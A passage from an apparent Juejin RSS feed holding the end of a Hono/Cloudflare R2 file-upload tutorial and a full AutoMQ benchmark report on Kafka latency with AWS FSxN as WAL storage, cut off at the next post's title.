<p><img alt="" src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/e5f5b5cf58d748ac912a4af6a724a2b7~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" width="1800" loading="lazy"/></p>
<p>然后运行命令：</p>
<pre><code class="hljs language-bash" lang="bash">wrangler deploy --minify</code></pre>
<p>这个主要是将绑定的存储桶R2可以在代码中使用不提示报错。</p>
<p>然后在index.ts中写上传逻辑：</p>
<pre><code class="hljs language-javascript" lang="javascript">app.<span class="hljs-title function_">post</span>(<span class="hljs-string">'/upload'</span>, <span class="hljs-keyword">async</span> (c) =&gt; {
    <span class="hljs-keyword">const</span> form = <span class="hljs-keyword">await</span> c.<span class="hljs-property">req</span>.<span class="hljs-title function_">parseBody</span>()
    <span class="hljs-keyword">const</span> file = form[<span class="hljs-string">'file'</span>] <span class="hljs-keyword">as</span> <span class="hljs-title class_">File</span>
    <span class="hljs-keyword">if</span> (!file || !file.<span class="hljs-property">name</span>) {
        <span class="hljs-keyword">return</span> c.<span class="hljs-title function_">json</span>({ <span class="hljs-attr">error</span>: <span class="hljs-string">'No file uploaded'</span> }, <span class="hljs-number">400</span>)
    }
    <span class="hljs-keyword">const</span> buffer = <span class="hljs-keyword">await</span> file.<span class="hljs-title function_">arrayBuffer</span>()
    <span class="hljs-keyword">const</span> object = <span class="hljs-keyword">await</span> c.<span class="hljs-property">env</span>.<span class="hljs-property">R2</span>.<span class="hljs-title function_">put</span>(file.<span class="hljs-property">name</span>, buffer)
    <span class="hljs-keyword">return</span> c.<span class="hljs-title function_">json</span>({ object })
})</code></pre>
<p>这个代码主要就是拿到post请求中的file文件，然后使用R2存储到桶里面，写完之后会返回存储后的结果，可以本地运行测试，本地启动服务后，使用postman或者apifox都可以测试：</p>
<p><img alt="" src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/cd9c60a4229c4e848df05ab6fb8d62fc~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" width="1728" loading="lazy"/></p>
<p>说明没有问题，这里可以上传任意类型的文件，访问的时候也可以访问任意类型。为什么不用Express框架？因为Express框架和cf不是很兼容，在访问视频文件或者大文件的时候，和cf不兼容，访问不到。所以强烈推荐Hono这个框架，而且Hono用起来和Express差不多，甚至更方便。</p>
<p/>
<p>然后开始写访问文件逻辑和下载逻辑：</p>
<pre><code class="hljs language-javascript" lang="javascript">app.<span class="hljs-title function_">get</span>(<span class="hljs-string">'/download/:key'</span>, <span class="hljs-keyword">async</span> (c) =&gt; {
    <span class="hljs-keyword">const</span> key = c.<span class="hljs-property">req</span>.<span class="hljs-title function_">param</span>(<span class="hljs-string">'key'</span>)
    <span class="hljs-keyword">const</span> object = <span class="hljs-keyword">await</span> c.<span class="hljs-property">env</span>.<span class="hljs-property">R2</span>.<span class="hljs-title function_">get</span>(key)
    <span class="hljs-keyword">if</span> (!object) {
        <span class="hljs-keyword">return</span> c.<span class="hljs-title function_">json</span>({ <span class="hljs-attr">error</span>: <span class="hljs-string">'File not found'</span> }, <span class="hljs-number">404</span>)
    }
    <span class="hljs-keyword">return</span> c.<span class="hljs-title function_">body</span>(object.<span class="hljs-property">body</span>)
})
</code></pre>
<p>这里主要就是发送get请求访问上传的文件，在apifox中访问刚才上传的文件：完美访问</p>
<p><img alt="" src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/f953aa4b79444e00a950c142b3d934c2~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" width="1526" loading="lazy"/></p>
<p/>
<p>还可以查询桶里面有哪些文件：</p>
<pre><code class="hljs language-javascript" lang="javascript">
app.<span class="hljs-title function_">get</span>(<span class="hljs-string">'/files'</span>, <span class="hljs-keyword">async</span> (c) =&gt; {
    <span class="hljs-keyword">const</span> objects = <span class="hljs-keyword">await</span> c.<span class="hljs-property">env</span>.<span class="hljs-property">R2</span>.<span class="hljs-title function_">list</span>()
    <span class="hljs-keyword">return</span> c.<span class="hljs-title function_">json</span>({ <span class="hljs-attr">files</span>: objects.<span class="hljs-property">objects</span>.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">object</span>) =&gt;</span> object.<span class="hljs-property">key</span>) })
})</code></pre>
<p>就会返回文件列表：</p>
<p><img alt="" src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/9b72365c36674d8c849793986c3f87fa~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" width="1540" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[技术干货 ｜AutoMQ x AWS FSxN: 性能报告]]></title>    <link>https://juejin.cn/post/7595028805157978122</link>    <guid>https://juejin.cn/post/7595028805157978122</guid>    <pubDate>2026-01-14T08:44:49.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595028805157978122" data-draft-id="7595028805157879818" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="技术干货 ｜AutoMQ x AWS FSxN: 性能报告"/> <meta itemprop="keywords" content="架构"/> <meta itemprop="datePublished" content="2026-01-14T08:44:49.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="AutoMQ"/> <meta itemprop="url" content="https://juejin.cn/user/2878958479084707"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            技术干货 ｜AutoMQ x AWS FSxN: 性能报告
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2878958479084707/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    AutoMQ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T08:44:49.000Z" title="Wed Jan 14 2026 08:44:49 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读9分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0"><strong>背景</strong></h2>
<p>AutoMQ 是一款基于 S3 构建的下一代“Diskless Kafka”，完全兼容 Kafka 协议。其云原生架构通过存算分离和按需弹性，显著提升了运维效率。最核心的突破在于，它利用共享存储消除了昂贵的跨可用区（Cross-AZ）数据传输费用，这能为多可用区集群每月节省数千甚至上万美元的网络成本。</p>
<p>在保持极致性价比的同时，AutoMQ 于 2025 年 12 月发布的版本正式引入了对 AWS FSx 作为 WAL 存储选项的支持，以进一步攻克 Diskless 架构的延迟瓶颈。这一演进使 AutoMQ 能够提供媲美本地磁盘的毫秒级延迟，同时保留零跨可用区流量成本和多可用区容灾能力，在低成本、高可靠与极致性能之间实现了完美平衡。</p>
<p>为了在真实生产环境下验证这些架构优势，我们进行了一系列性能基准测试，重点关注客户端观测到的端到端延迟。
<br/></p>
<blockquote>
<p>Tips:</p>
<ul>
<li>AutoMQ FSxN 能力的正式发布请参考文章：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgo.automq.com%2Fautomq-fsx-10ms-latency-diskless-kafka-on-aws" target="_blank" title="https://go.automq.com/automq-fsx-10ms-latency-diskless-kafka-on-aws" ref="nofollow noopener noreferrer">AutoMQ x FSx: 10ms Latency Diskless Kafka on AWS</a></li>
<li>AutoMQ FSxN 实现原理介绍请参考文章： <a href="https://link.juejin.cn?target=https%3A%2F%2Fgo.automq.com%2Fhow-does-automq-implement-sub-10ms-latency-diskless-kafka" target="_blank" title="https://go.automq.com/how-does-automq-implement-sub-10ms-latency-diskless-kafka" ref="nofollow noopener noreferrer">How does AutoMQ implement a sub-10ms latency Diskless Kafka？</a></li>
</ul>
</blockquote>
<br/>
<h2 data-id="heading-1"><strong>测试场景和结果</strong></h2>
<p>要理解测试结果，我们首先需要拆解延迟的产生环节：</p>
<h3 data-id="heading-2"><strong>延迟的构成</strong></h3>
<p>从业务视角来看，延迟主要源于两个方面：Kafka 客户端的排队延迟以及服务端的处理延迟。在接下来的章节中，我们将对这两个部分进行拆解分析，从而让大家能够清晰地理解 AutoMQ 结合 FSxN 设计对二者的具体影响。</p>
<h4 data-id="heading-3"><strong>服务端处理延迟</strong></h4>
<p>传统的 Kafka 架构服务端的主要延迟消耗在：客户端与服务的跨 AZ 通信，以及副本完成跨 AZ 复制（ACK=ALL）。这两段的跨 AZ 通信都是直接的 RPC 请求，在 AWS 上会产生高额的流量。</p>
<p>AutoMQ 从整体架构上做了一些变化：采用 AWS FSx 作为 WAL 存储，省去副本复制的流量费；同时通过 FSx 中继客户端和服务端的跨 AZ 请求，减少客户端和服务端的跨 AZ 流量费。由于增加了转发逻辑，会带来少量额外的处理延迟，但却极大的减少了流量成本。
<br/></p>
<p><img src="https://image.automq.com/20260114bot/w6tbmd.png" alt="" loading="lazy"/>
<br/></p>
<h4 data-id="heading-4">客户端排队延迟</h4>
<p>Kafka 生产者采用“先攒批、后发送”的两阶段设计：首先将消息按分区在内存中累积，当达到<code>batch.size</code> 大小或 <code>linger.ms</code> 时间则会将消息放入就绪队列等待发送；网络层在并发限制内，从队列取出批次并发送到服务端。</p>
<p>在追求极致吞吐的场景下，业务常通过调大 <code>linger.ms</code> 主动攒批，但这会导致请求在客户端排队，从而在业务视角表现为更高的延迟；通常可通过 <code>linger.ms</code> 和 <code>batch.size</code> 两个参数在吞吐与延迟之间进行权衡。这一块可以参考之前的文章，里面有详细介绍：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgo.automq.com%2Fkafka-performance-tuning-linger-ms-batch-size" target="_blank" title="https://go.automq.com/kafka-performance-tuning-linger-ms-batch-size" ref="nofollow noopener noreferrer">Kafka Performance Tuning: Best Practice for linger.ms and batch.size</a>
<br/></p>
<h3 data-id="heading-5"><strong>测试场景选择</strong></h3>
<p>为了全面、客观地评估 AutoMQ 在引入 AWS FSxN 后的性能表现，并提供具备实战参考价值的性能数据，我们将测试场景设定为两个维度：<strong>极致性能基准（Baseline）与生产稳态模型（Robustness）</strong>。
<br/></p>
<h4 data-id="heading-6"><strong>极致性能基准场景：服务端延迟物理上限测试</strong></h4>
<p>在分布式系统中，客户端的排队机制往往会掩盖存储介质真实的 I/O 响应。因此，我们首先通过设置 <code>linger.ms=0</code> 且在低并发压力下进行测试，旨在构建一个“零排队”的理想环境。</p>
<ul>
<li><strong>测试目的：</strong> 剥离客户端干扰，直接探测 AutoMQ 结合 FSxN WAL 后的<strong>服务端核心处理时延</strong>与<strong>网络中继损耗</strong>，确立该方案的物理性能边界。
<br/></li>
</ul>
<h4 data-id="heading-7"><strong>生产稳态模型场景：高吞吐下的确定性延迟测试</strong></h4>
<p>在真实的生产实践中，流量波动（Burst）、生产者扩缩容以及分区负载不均是常态。为了追求吞吐量与成本的平衡，开发者通常会通过 <code>linger.ms</code> 和 <code>batch.size</code> 进行攒批调优。</p>
<ul>
<li><strong>测试目的：</strong> 我们选取了典型的生产配置（如 <code>linger.ms=3</code>），并模拟<strong>集群满负载运行</strong>状态。此场景旨在验证在真实业务压力下，AutoMQ 是否能提供<strong>高确定性的延迟输出</strong>，并观察其在处理海量小包写入（High TPS）时的尾部延迟（P99/P999）表现。</li>
</ul>
<p>通过这两个维度的对比，我们不仅能展示该方案在理想状态下的爆发力，更能证明其在复杂生产环境下作为核心基础设施的稳定性。</p>
<h3 data-id="heading-8"><strong>详细测试</strong></h3>
<p>测试环境如下：</p>
<ul>
<li>使用 <a href="https://link.juejin.cn?target=https%3A%2F%2Fopenmessaging.cloud%2Fdocs%2Fbenchmarks%2F" target="_blank" title="https://openmessaging.cloud/docs/benchmarks/" ref="nofollow noopener noreferrer">OpenMessaging</a> 基准测试框架，写入总吞吐 300MiB/s，Fanout 比例为 1:4；</li>
<li>Server: m7g.4xlarge *3;</li>
<li>WAL Storage: FSx 736MBps、1T SSD、3072IOPS;</li>
<li>Client: m7g.4xlarge *3;</li>
<li>集群水位满载运行；
<br/></li>
</ul>
<h4 data-id="heading-9"><strong>耗时最短的场景</strong></h4>
<p>为了探测系统的物理性能上限，我们构建了一个“零排队”的理想环境，重点调整了影响时延的关键参数：</p>
<ul>
<li><code>batch.size</code>=64K、<code>linger.ms</code>=0（默认）</li>
<li>不开压缩（开启压缩会降低写入吞吐量，带来更低的写入延迟，降低测试场景的挑战）</li>
</ul>
<p>具体配置如下：</p>
<pre><code class="hljs language-ini" lang="ini">name: Kafka
driverClass: io.openmessaging.benchmark.driver.kafka.KafkaBenchmarkDriver
<span class="hljs-comment"># Kafka client-specific configuration</span>
replicationFactor: 1
topicConfig: |
  <span class="hljs-attr">min.insync.replicas</span>=<span class="hljs-number">2</span>
commonConfig: |
  <span class="hljs-attr">bootstrap.servers</span>=<span class="hljs-number">10.0</span>.<span class="hljs-number">0.112</span>:<span class="hljs-number">9092</span>
producerConfig: |
  <span class="hljs-attr">acks</span>=<span class="hljs-number">1</span>
  <span class="hljs-attr">batch.size</span>=<span class="hljs-number">65536</span>
  <span class="hljs-attr">client.id</span>=automq_type=producer&amp;automq_az=us-east-<span class="hljs-number">1</span>b
consumerConfig: |
  <span class="hljs-attr">auto.offset.reset</span>=earliest
  <span class="hljs-attr">enable.auto.commit</span>=<span class="hljs-literal">true</span>
  <span class="hljs-attr">client.id</span>=automq_type=consumer&amp;automq_az=us-east-<span class="hljs-number">1</span>b
</code></pre>
<ul>
<li>Record Size = 64 KB</li>
<li>写入 TPS = 4,800</li>
<li>分区总数 = 96</li>
<li>Producer 数量 = 48</li>
</ul>
<p>工作负载配置如下：</p>
<pre><code class="hljs language-vbnet" lang="vbnet"><span class="hljs-symbol">name:</span> Lowest latency <span class="hljs-keyword">case</span>
<span class="hljs-symbol">topics:</span> <span class="hljs-number">1</span>
<span class="hljs-symbol">partitionsPerTopic:</span> <span class="hljs-number">32</span>
<span class="hljs-symbol">messageSize:</span> <span class="hljs-number">65536</span>
<span class="hljs-symbol">payloadFile:</span> <span class="hljs-string">"payload/payload-64Kb.data"</span>
<span class="hljs-symbol">subscriptionsPerTopic:</span> <span class="hljs-number">4</span>
<span class="hljs-symbol">consumerPerSubscription:</span> <span class="hljs-number">16</span>
<span class="hljs-symbol">producersPerTopic:</span> <span class="hljs-number">16</span>
<span class="hljs-symbol">producerRate:</span> <span class="hljs-number">1600</span>
<span class="hljs-symbol">consumerBacklogSizeGB:</span> <span class="hljs-number">0</span>
</code></pre>
<br/>
<h5 data-id="heading-10"><strong>运行结果</strong></h5>
<p>写入总吞吐图 300MiB/s，读取约 1.2GiB/s；</p>
<p><img src="https://image.automq.com/20260114bot/vr4whu.png" alt="" loading="lazy"/></p>
<p>CPU 消耗约 27.5%，内存占用约 10G；</p>
<p><img src="https://image.automq.com/20260114bot/dnv207.png" alt="" loading="lazy"/></p>
<p>写入平均延迟 6.0ms、P99 13.11ms、P999 17.68ms；</p>
<p><img src="https://image.automq.com/20260114bot/pcnn4u.png" alt="" loading="lazy"/></p>
<p>端到端平均延迟 7.79ms、19.0ms、29.0ms；</p>
<p><img src="https://image.automq.com/20260114bot/17j6se.png" alt="" loading="lazy"/></p>
<p><img src="https://image.automq.com/20260114bot/xdkjh5.png" alt="" loading="lazy"/></p>
<p><code>linger.ms</code>=0 即不等待攒批完成，如果当前进行中请求不超过请求最大并发数，则会立即将消息发送到服务端，这种情况下耗时客户端耗时最短。但当随着业务量峰谷的变化，写入吞吐量、TPS 上涨等，可能会受请求并发数限制产生额外的客户端排队，从而影响最终的延迟。</p>
<p>所以，该场景为理想情况下的延迟；虽然耗时更短，但容易受业务量、客户端数量的影响出现起伏，不够稳定。
<br/></p>
<h4 data-id="heading-11"><strong>耗时更加稳定的场景</strong></h4>
<p>既然极致性能场景存在波动的风险，那么在追求吞吐量与稳定性平衡的生产环境下，AutoMQ 的表现又会如何呢？接下来让我们观察在开启客户端攒批后的稳态测试结果。</p>
<ul>
<li><code>batch.size</code>=64K</li>
<li><code>linger.ms</code>=3（根据服务端处理耗时估算出客户端攒批的时间）</li>
</ul>
<p>具体配置如下：</p>
<pre><code class="hljs language-ini" lang="ini">name: Kafka
driverClass: io.openmessaging.benchmark.driver.kafka.KafkaBenchmarkDriver
<span class="hljs-comment"># Kafka client-specific configuration</span>
replicationFactor: 1
topicConfig: |
  <span class="hljs-attr">min.insync.replicas</span>=<span class="hljs-number">2</span>
commonConfig: |
  <span class="hljs-attr">bootstrap.servers</span>=<span class="hljs-number">10.0</span>.<span class="hljs-number">0.112</span>:<span class="hljs-number">9092</span>
producerConfig: |
  <span class="hljs-attr">acks</span>=<span class="hljs-number">1</span>
  <span class="hljs-attr">linger.ms</span>=<span class="hljs-number">3</span>
  <span class="hljs-attr">batch.size</span>=<span class="hljs-number">65536</span>
  <span class="hljs-attr">client.id</span>=automq_type=producer&amp;automq_az=us-east-<span class="hljs-number">1</span>b
consumerConfig: |
  <span class="hljs-attr">auto.offset.reset</span>=earliest
  <span class="hljs-attr">enable.auto.commit</span>=<span class="hljs-literal">true</span>
  <span class="hljs-attr">client.id</span>=automq_type=consumer&amp;automq_az=us-east-<span class="hljs-number">1</span>b
</code></pre>
<p>更小的消息会带来更多的写入消耗，为了更有通用性，我们将 recordsize 设置了更小，以使结果在更多的场景适用。</p>
<ul>
<li>record.size = 1K</li>
<li>写入 TPS = 307200</li>
<li>分区总数 = 96</li>
<li>Producer = 15</li>
</ul>
<p>具体工作负载配置如下：</p>
<pre><code class="hljs language-vbnet" lang="vbnet"><span class="hljs-symbol">name:</span> <span class="hljs-number">1</span> Robust latency <span class="hljs-keyword">case</span>
<span class="hljs-symbol">topics:</span> <span class="hljs-number">1</span>
<span class="hljs-symbol">partitionsPerTopic:</span> <span class="hljs-number">32</span>
<span class="hljs-symbol">messageSize:</span> <span class="hljs-number">1024</span>
<span class="hljs-symbol">payloadFile:</span> <span class="hljs-string">"payload/payload-1Kb.data"</span>
<span class="hljs-symbol">subscriptionsPerTopic:</span> <span class="hljs-number">4</span>
<span class="hljs-symbol">consumerPerSubscription:</span> <span class="hljs-number">5</span>
<span class="hljs-symbol">producersPerTopic:</span> <span class="hljs-number">5</span>
<span class="hljs-symbol">producerRate:</span> <span class="hljs-number">102400</span>
<span class="hljs-symbol">consumerBacklogSizeGB:</span> <span class="hljs-number">0</span>
</code></pre>
<br/>
<h5 data-id="heading-12"><strong>运行结果</strong></h5>
<p>写入总吞吐图 300MiB/s，读取约 1.2GiB/s；</p>
<p><img src="https://image.automq.com/20260114bot/5gw9o1.png" alt="" loading="lazy"/></p>
<p>CPU 消耗约 31.5%，内存占用约 14G；</p>
<p><img src="https://image.automq.com/20260114bot/gxefe5.png" alt="" loading="lazy"/></p>
<p>写入平均延迟 7.89ms、P99 16.30ms、P999 30.26ms；</p>
<p><img src="https://image.automq.com/20260114bot/0dhgxi.png" alt="" loading="lazy"/></p>
<p>端到端平均延迟 9.88ms、22.0ms、38.0ms；</p>
<p><img src="https://image.automq.com/20260114bot/9kg8ta.png" alt="" loading="lazy"/></p>
<p><img src="https://image.automq.com/20260114bot/mf4w16.png" alt="" loading="lazy"/></p>
<p>增加了<code>linger.ms</code>=3 会带来额外的客户端延迟，但能带来更加稳定的攒批结果，能更好的应对业务流量峰谷，集群扩缩容 Producer 数目变化对延迟的影响，能够提供更加稳定的延迟表现，在实际生产中更具有参考意义。</p>
<p>此外，测试用例是按照集群满负载的情况运行，对 P99、P999 的更具有挑战。AutoMQ 内部经过大量优化，以确保文件系统耗时更加稳定。</p>
<p>从文件系统写入延迟热力图看 90%的写入响应都在 1ms 以下，同时 91%的读取都在 1ms 以下。</p>
<p><img src="https://image.automq.com/20260114bot/ct2a3e.png" alt="" loading="lazy"/></p>
<p><img src="https://image.automq.com/20260114bot/k4ebot.png" alt="" loading="lazy"/>
<br/></p>
<h2 data-id="heading-13"><strong>关于成本</strong></h2>
<br/>
<p>看到这里，你可能会产生疑问：既然性能实现了如此惊人的飞跃，成本是否也会随之“水涨船高”？</p>
<p>事实恰恰相反。在 AutoMQ 的集成架构中，FSxN 并非用于海量数据的长期堆积，而是仅作为“高速缓冲站”运行。它只负责承载极少量的最新预写日志（WAL），而海量的业务数据依然存储在价格极低的 S3 中。</p>
<p>为什么成本依然极低：</p>
<ul>
<li><strong>按需占用，规模固定：</strong> 由于数据会迅速沉降到 S3 存储桶，FSxN 仅需占用极小且固定的资源容量，不会随业务数据量的增长而产生高额费用。</li>
<li><strong>省下巨额流量费：</strong> 虽然集成 FSxN 会带来少量的资源开销，但它彻底消除了传统 Kafka 最昂贵的“跨 AZ 复制流量费”。</li>
<li><strong>99% 的存储在 S3：</strong> 绝大部分数据都存储在成本极低的 S3 上。</li>
</ul>
<p>这意味着即使集成了 FSxN 提升性能，AutoMQ 的整体拥有成本（TCO）依然比传统 Kafka 节省近 90%。</p>
<p>详细可以查看：👉 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgo.automq.com%2Fautomq-fsx-10ms-latency-diskless-kafka-on-aws" target="_blank" title="https://go.automq.com/automq-fsx-10ms-latency-diskless-kafka-on-aws" ref="nofollow noopener noreferrer">AutoMQ x FSx: 10ms Latency Diskless Kafka on AWS</a>
<br/></p>
<h2 data-id="heading-14"><strong>总结</strong></h2>
<br/>
<p>通过引入 FSxN 作为 WAL，<a href="https://link.juejin.cn?target=https%3A%2F%2Fgo.automq.com%2Fhome" target="_blank" title="https://go.automq.com/home" ref="nofollow noopener noreferrer">AutoMQ</a> 在保持跨 AZ 容灾与 S3 存算分离优势的同时，将平均写入延迟从数百毫秒大幅降至 10ms 以内，性能表现媲美本地磁盘。这一突破彻底补齐了 Diskless 架构的性能短板，使其能够以极具竞争力的成本和高稳定性，完美支撑微服务、风控及交易撮合等延迟敏感型核心业务。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vercel 凌晨突发：agent-browser 来了，减少 93% 上下文！AI 终于有了“操纵现实”的手！ 🚀]]></title>    <link>https://juejin.cn/post/7594722586732773382</link>    <guid>https://juejin.cn/post/7594722586732773382</guid>    <pubDate>2026-01-14T06:51:20.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594722586732773382" data-draft-id="7594863660296863786" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vercel 凌晨突发：agent-browser 来了，减少 93% 上下文！AI 终于有了“操纵现实”的手！ 🚀"/> <meta itemprop="keywords" content="人工智能,机器学习,爬虫"/> <meta itemprop="datePublished" content="2026-01-14T06:51:20.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Delroy"/> <meta itemprop="url" content="https://juejin.cn/user/184373682644119"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vercel 凌晨突发：agent-browser 来了，减少 93% 上下文！AI 终于有了“操纵现实”的手！ 🚀
